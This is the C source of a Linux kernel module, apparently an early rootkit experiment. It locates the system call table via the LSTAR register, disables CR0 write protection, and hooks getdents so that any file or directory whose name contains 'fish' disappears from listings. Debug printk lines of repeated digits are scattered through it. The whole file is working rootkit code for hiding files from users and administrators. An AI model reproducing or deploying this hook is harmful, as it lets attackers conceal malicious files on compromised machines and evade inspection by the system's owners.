#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#define CALLOFF 100

#ifndef PID_MAX   
#define PID_MAX 0x8000   
#endif

#include <linux/init.h>   
#include <linux/stddef.h>     
#include <linux/mm.h>  
#include <linux/in.h>  
#include <asm/processor.h>  
#include <linux/proc_fs.h>

struct linux_dirent{
    unsigned long     d_ino;
    unsigned long     d_off;
    unsigned short    d_reclen;
    char    d_name[1];
};

static unsigned long ** sys_call_table;

long (*old_getdents)(unsigned int fd, struct linux_dirent __user *dirp,
                    unsigned int count);

void disable_write_protection(void)
{
        unsigned long cr0 = read_cr0();
        clear_bit(16, &cr0);
        write_cr0(cr0);
}

void enable_write_protection(void)
{
        unsigned long cr0 = read_cr0();
        set_bit(16, &cr0);
        write_cr0(cr0);
}

void *
get_lstar_sct_addr(void)
{
    u64 lstar;
    u64 index;

    rdmsrl(MSR_LSTAR, lstar);
    for (index = 0; index <= PAGE_SIZE; index += 1) {
        u8 *arr = (u8 *)lstar + index;

        if (arr[0] == 0xff && arr[1] == 0x14 && arr[2] == 0xc5) {
            return arr + 3;
        }
    }

    return NULL;
}


unsigned long **
get_lstar_sct(void)
{

    printk("222222222222222222222222222222222222222222222222222222222222222");
    unsigned long *lstar_sct_addr = get_lstar_sct_addr();
    if (lstar_sct_addr != NULL) {
        u64 base = 0xffffffff00000000;
        u32 code = *(u32 *)lstar_sct_addr;
        return (void *)(base | code);
    } else {
        return NULL;
    }                                         
}


asmlinkage long my_getdents(unsigned int fd, struct linux_dirent __user *dirp,
                    unsigned int count){



struct linux_dirent *td,*td1,*td2,*td3;  
int number;
int copy_len = 0;
//char file_name[255]; 

printk("111111111111111111111111111111111111111111111111111111111111");  
    // 调用原始的系统调用，下面对返回结果进行过滤  
    number = (*old_getdents) (fd, dirp, count);  
    if (!number)  
        return (number);  
  
    // 分配内核空间，并把用户空间的数据拷贝到内核空间  
    td2 = (struct linux_dirent *) kmalloc(number, GFP_KERNEL);
    td1 = (struct linux_dirent *) kmalloc(number, GFP_KERNEL);
    td = td1;
    td3 = td2;
    copy_from_user(td2, dirp, number);  
  
    while(number>0){

        printk("33333333333333333333333333333333333333333333333333333333333");
        printk("%d\n",number);  
        printk("%d\n",td2->d_reclen);
        number = number - td2->d_reclen;
        printk("%s\n",td2->d_name);
        
        if(strstr(td2->d_name,"fish") == NULL){
            memmove(td1, (char *) td2 , td2->d_reclen);
            td1 = (struct linux_dirent *) ((char *)td1 + td2->d_reclen);
            copy_len = copy_len + td2->d_reclen;
        }
        
        td2 = (struct linux_dirent *) ((char *)td2 + td2->d_reclen);
            
    }

    // 将过滤后的数据拷贝回用户空间
    copy_to_user(dirp, td, copy_len);  
    kfree(td); 
    kfree(td3);
    return (copy_len);  
}


static int filter_init(void)
{   
    //int i = 0;
    sys_call_table = get_lstar_sct();
    if (!sys_call_table)
    {
        printk("get_act_addr(): NULL...\n");
        return 0;
    }
    else{

        printk("SYSCALLNO getdents,ADDRESS 0x%x\n",(unsigned int)sys_call_table[__NR_getdents]);
        old_getdents = (void *)sys_call_table[__NR_getdents];
        printk("SYSCALLNO getdents,ADDRESS 0x%x\n",(unsigned long *)old_getdents);
        printk("SYSCALLNO getdents,ADDRESS 0x%x\n",(unsigned long *)&my_getdents);
        disable_write_protection();
        sys_call_table[__NR_getdents] = (unsigned long *)&my_getdents;
        enable_write_protection();
        printk("SYSCALLNO getdents,ADDRESS 0x%x\n",(unsigned int)sys_call_table[__NR_getdents]);

        printk("sct: 0x%p\n", (unsigned long)sys_call_table);
    return 0;
    }   
}


static void filter_exit(void)
{
    printk("----------------------------------------------------------------------------------");
    printk("SYSCALLNO getdents,ADDRESS 0x%x\n",(unsigned int)sys_call_table[__NR_getdents]);
    disable_write_protection();
    sys_call_table[__NR_getdents] = (unsigned long *)old_getdents;
    enable_write_protection();
    printk("SYSCALLNO getdents,ADDRESS 0x%x\n",(unsigned int)sys_call_table[__NR_getdents]);
    printk(KERN_INFO "hideps: module removed\n");
}


MODULE_LICENSE("GPL");
module_init(filter_init);
module_exit(filter_exit);

